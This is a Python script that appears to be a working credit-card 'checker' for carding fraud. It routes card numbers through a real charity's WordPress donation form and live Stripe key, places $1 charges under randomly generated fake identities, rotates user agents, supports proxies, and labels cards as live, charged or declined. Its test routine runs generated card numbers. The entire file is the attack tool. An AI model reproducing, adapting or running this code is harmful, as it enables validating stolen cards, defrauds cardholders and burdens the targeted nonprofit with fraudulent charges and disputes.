import asyncio
import aiohttp
import random
import string
import json
import re
import time
from typing import Tuple, Optional, Dict, Any


class StripeChecker:
    PK = "pk_live_51OHU82G6QgVuFQ5rphUjLzuzShgA7hPvcXGSNikT6JwVc8qCpML2iCUsQUpT5f59KLdPrAz0aJiScC6BcVsEZ0VN00l8UKpCiC"
    SITE = "https://resilienceprisonproject.com/donate/"
    AJAX = "https://resilienceprisonproject.com/wp-admin/admin-ajax.php"
    FORM_ID = "4987"
    AUTHOR = "2"
    POST_ID = "4021"

    FIRST_NAMES = [
        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
        "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
        "Thomas","Sarah","Charles","Karen","Christopher","Lisa","Daniel","Nancy",
        "Matthew","Betty","Anthony","Margaret","Mark","Sandra","Donald","Ashley",
        "Steven","Dorothy","Andrew","Kimberly","Paul","Emily","Joshua","Donna",
    ]
    LAST_NAMES = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
        "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker",
    ]
    CITIES = [
        ("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),
        ("Houston","TX","77001"),("Phoenix","AZ","85001"),("Philadelphia","PA","19101"),
        ("San Antonio","TX","78201"),("San Diego","CA","92101"),("Dallas","TX","75201"),
        ("San Jose","CA","95101"),("Austin","TX","73301"),("Jacksonville","FL","32099"),
        ("Fort Worth","TX","76101"),("Columbus","OH","43085"),("Charlotte","NC","28201"),
        ("Denver","CO","80201"),("Portland","OR","97201"),("Seattle","WA","98101"),
        ("Boston","MA","02101"),("Nashville","TN","37201"),("Atlanta","GA","30301"),
        ("Miami","FL","33101"),("Minneapolis","MN","55401"),("Tampa","FL","33601"),
    ]
    STREETS = ["Main","Oak","Maple","Cedar","Elm","Pine","Birch","Walnut","Cherry",
               "Park","Lake","Hill","Forest","River","Spring","Sunset","Valley"]

    TOKEN_TTL = 300

    def __init__(self):
        self._ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
        ]
        self._page_token = None
        self._page_token_ts = 0

    def invalidate_token(self):
        self._page_token = None
        self._page_token_ts = 0

    def _ua(self) -> str:
        return random.choice(self._ua_list)

    def _rand_person(self) -> Dict[str, str]:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        city, state, zipcode = random.choice(self.CITIES)
        return {
            "first": first,
            "last": last,
            "name": f"{first} {last}",
            "email": f"{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(10,99)}@gmail.com",
            "address": f"{random.randint(100, 9999)} {random.choice(self.STREETS)} {'St' if random.random() > 0.5 else 'Ave'}",
            "city": city,
            "state": state,
            "zip": zipcode,
            "phone": f"{random.randint(200,999)}{random.randint(1000000,9999999)}",
        }

    @staticmethod
    def luhn_check(number: str) -> bool:
        digits = [int(d) for d in number if d.isdigit()]
        if len(digits) < 13:
            return False
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
        return checksum % 10 == 0

    async def _get_page_token(self, session: aiohttp.ClientSession, ua: str, force: bool = False) -> Optional[str]:
        if self._page_token and not force and (time.time() - self._page_token_ts) < self.TOKEN_TTL:
            return self._page_token
        try:
            async with session.get(self.SITE, headers={
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                html = await resp.text()
                m = re.search(r'data-token="([^"]+)"', html)
                if m:
                    self._page_token = m.group(1)
                    self._page_token_ts = time.time()
                    return self._page_token
        except:
            pass
        return None

    async def _create_pm(self, session: aiohttp.ClientSession,
                         cc: str, mm: str, yy: str, cvv: str,
                         person: Dict[str, str], ua: str) -> Tuple[Optional[str], Optional[Dict], Optional[str]]:
        data = {
            "type": "card",
            "card[number]": cc,
            "card[exp_month]": mm.zfill(2),
            "card[exp_year]": yy if len(yy) == 4 else f"20{yy}",
            "card[cvc]": cvv,
            "billing_details[name]": person["name"],
            "billing_details[email]": person["email"],
            "billing_details[address][postal_code]": person["zip"],
            "billing_details[address][country]": "US",
            "key": self.PK,
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": ua,
        }
        try:
            async with session.post("https://api.stripe.com/v1/payment_methods",
                                     data=data, headers=headers,
                                     timeout=aiohttp.ClientTimeout(total=15)) as resp:
                body = await resp.json()
                if "id" in body:
                    return body["id"], body.get("card", {}), None
                err = body.get("error", {})
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "Unknown error")
                return None, None, f"{code}|{decline}|{msg}"
        except Exception as e:
            return None, None, f"PM_ERROR|{e}"

    async def _submit_form(self, session: aiohttp.ClientSession,
                           pm_id: str, person: Dict[str, str],
                           page_token: str, ua: str) -> Tuple[Optional[str], Optional[str]]:
        form_data = {
            "wpforms[fields][0][first]": person["first"],
            "wpforms[fields][0][last]": person["last"],
            "wpforms[fields][1]": person["email"],
            "wpforms[fields][2]": "1.00",
            "wpforms[fields][4]": "No",
            "wpforms[fields][6]": person["phone"],
            "wpforms[fields][7]": "One Time",
            "wpforms[fields][8]": "No",
            "wpforms[fields][11]": "$1.00",
            "wpforms[id]": self.FORM_ID,
            "wpforms[author]": self.AUTHOR,
            "wpforms[post_id]": self.POST_ID,
            "wpforms[payment_method_id]": pm_id,
            "wpforms[token]": page_token,
            "wpforms[submit]": "wpforms-submit",
            "action": "wpforms_submit",
            "page_url": self.SITE,
            "page_title": "Donate",
            "page_id": self.POST_ID,
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://resilienceprisonproject.com",
            "Referer": self.SITE,
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": ua,
        }
        try:
            async with session.post(self.AJAX, data=form_data, headers=headers,
                                     timeout=aiohttp.ClientTimeout(total=30)) as resp:
                body = await resp.json()
                if body.get("success"):
                    data = body.get("data", {})
                    if isinstance(data, dict):
                        pi_secret = data.get("payment_intent_client_secret")
                        if pi_secret:
                            return pi_secret, None
                        return None, data.get("error", "No PI secret returned")
                    return None, str(data)[:100]
                data = body.get("data", {})
                if isinstance(data, dict):
                    return None, data.get("error", data.get("message", "Form rejected"))
                return None, str(data)[:100] if data else "Form rejected"
        except Exception as e:
            return None, f"FORM_ERROR|{e}"

    async def _confirm_pi(self, session: aiohttp.ClientSession,
                          pi_secret: str, pm_id: str, ua: str) -> Tuple[str, str, str]:
        pi_id = pi_secret.split("_secret_")[0]
        data = {
            "use_stripe_sdk": "true",
            "return_url": self.SITE,
            "payment_method": pm_id,
            "key": self.PK,
            "client_secret": pi_secret,
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": ua,
        }
        try:
            async with session.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                                     data=data, headers=headers,
                                     timeout=aiohttp.ClientTimeout(total=20)) as resp:
                body = await resp.json()
                status = body.get("status")
                if status == "succeeded":
                    amount = body.get("amount", 0) / 100
                    return "succeeded", "", f"Charged ${amount:.2f}"
                if status == "requires_action":
                    return "requires_action", "", "3DS Required"

                err = body.get("last_payment_error") or body.get("error", {})
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "Payment failed")
                return "failed", f"{code}|{decline}", msg
        except Exception as e:
            return "error", "", f"CONFIRM_ERROR|{e}"

    @staticmethod
    def _classify(pm_error: Optional[str],
                  pi_status: str, pi_codes: str, pi_msg: str) -> Tuple[str, str]:
        if pm_error:
            parts = pm_error.split("|")
            code = parts[0].lower() if len(parts) > 0 else ""
            decline = parts[1].lower() if len(parts) > 1 else ""
            msg = parts[2] if len(parts) > 2 else pm_error

            if "incorrect_number" in code:
                return "DECLINED", "Invalid Card Number"
            if "invalid_expiry" in code:
                return "DECLINED", "Invalid Expiry"
            if "card_declined" in code:
                if "live_mode_test_card" in decline:
                    return "DECLINED", "Test Card Rejected"
                if "stolen" in decline or "lost" in decline:
                    return "DECLINED", "Lost/Stolen Card"
                return "DECLINED", msg[:80]
            if "expired" in code:
                return "DECLINED", "Expired Card"
            if "rate_limit" in code:
                return "RETRY", "Rate Limited"
            return "ERROR", msg[:80]

        if pi_status == "succeeded":
            return "CHARGED", pi_msg
        if pi_status == "requires_action":
            return "APPROVED", "3DS Required (Card is LIVE)"

        codes = pi_codes.lower()
        msg_lower = pi_msg.lower()

        if "authentication_required" in codes:
            return "APPROVED", "Authentication Required (Card is LIVE)"

        if "incorrect_cvc" in codes or "invalid_cvc" in codes:
            return "CCN", "CVV Declined (Card is LIVE)"

        if "insufficient_funds" in codes or "insufficient" in msg_lower:
            return "INSUFFICIENT", "Insufficient Funds (Card is LIVE)"

        if "card_declined" in codes:
            if "do_not_honor" in codes:
                return "DECLINED", "Do Not Honor"
            if "stolen_card" in codes or "lost_card" in codes or "pick_up_card" in codes:
                return "DECLINED", "Lost/Stolen Card"
            if "restricted_card" in codes:
                return "DECLINED", "Restricted Card"
            if "withdrawal_count_exceeded" in codes:
                return "DECLINED", "Withdrawal Count Exceeded"
            if "expired_card" in codes:
                return "DECLINED", "Expired Card"
            if "fraudulent" in codes:
                return "DECLINED", "Flagged Fraudulent"
            if "generic_decline" in codes:
                return "DECLINED", "Generic Decline"
            return "DECLINED", pi_msg[:80]

        if "incorrect_number" in codes or "invalid_number" in codes or "card number is incorrect" in msg_lower:
            return "DECLINED", "Invalid Card Number"

        if pi_status == "error":
            return "ERROR", pi_msg[:80]

        return "UNKNOWN", pi_msg[:80]

    async def check_card(self, cc: str, mes: str, ano: str, cvv: str,
                         proxy: Optional[str] = None) -> Tuple[str, str]:
        cc_clean = re.sub(r"\D", "", cc)
        if not self.luhn_check(cc_clean):
            return "DECLINED", "Invalid Card Number (Luhn)"
        if len(cc_clean) < 13 or len(cc_clean) > 19:
            return "DECLINED", "Invalid Card Number Length"

        person = self._rand_person()
        ua = self._ua()

        connector = None
        if proxy:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            except ImportError:
                pass

        async with aiohttp.ClientSession(connector=connector) as session:
            page_token = await self._get_page_token(session, ua)
            if not page_token:
                return "ERROR", "Could not load donation page"

            pm_id, card_data, pm_error = await self._create_pm(session, cc_clean, mes, ano, cvv, person, ua)

            card_info = ""
            if card_data:
                brand = card_data.get("brand", "?")
                funding = card_data.get("funding", "?")
                country = card_data.get("country", "??")
                last4 = card_data.get("last4", "????")
                card_info = f"{brand.upper()} {funding} {country} ...{last4}"

            if pm_error:
                status, msg = self._classify(pm_error, "", "", "")
                return status, f"{msg} | BIN={cc_clean[:6]}"

            pi_secret, form_error = await self._submit_form(session, pm_id, person, page_token, ua)
            if form_error:
                self.invalidate_token()
                page_token = await self._get_page_token(session, ua, force=True)
                if page_token:
                    pi_secret, form_error = await self._submit_form(session, pm_id, person, page_token, ua)
            if form_error:
                if "FORM_ERROR" in form_error:
                    return "ERROR", f"Form submission failed | {card_info}"
                return "ERROR", f"Form: {form_error[:60]} | {card_info}"

            pi_status, pi_codes, pi_msg = await self._confirm_pi(session, pi_secret, pm_id, ua)
            status, msg = self._classify(None, pi_status, pi_codes, pi_msg)

            return status, f"{msg} | {card_info}"

    def invalidate_token(self):
        self._page_token = None


async def _test():
    checker = StripeChecker()
    test_cards = [
        ("4546765954643673", "07", "2031", "370", "gen card"),
        ("4532015112830366", "11", "2028", "123", "gen card 2"),
        ("1234567890123456", "12", "2030", "123", "bad luhn"),
        ("4111111111111111", "12", "2030", "123", "test card"),
    ]
    for cc, mm, yy, cvv, label in test_cards:
        status, msg = await checker.check_card(cc, mm, yy, cvv)
        print(f"[{label}] {cc[:6]}...{cc[-4:]}: [{status}] {msg}")


if __name__ == "__main__":
    asyncio.run(_test())
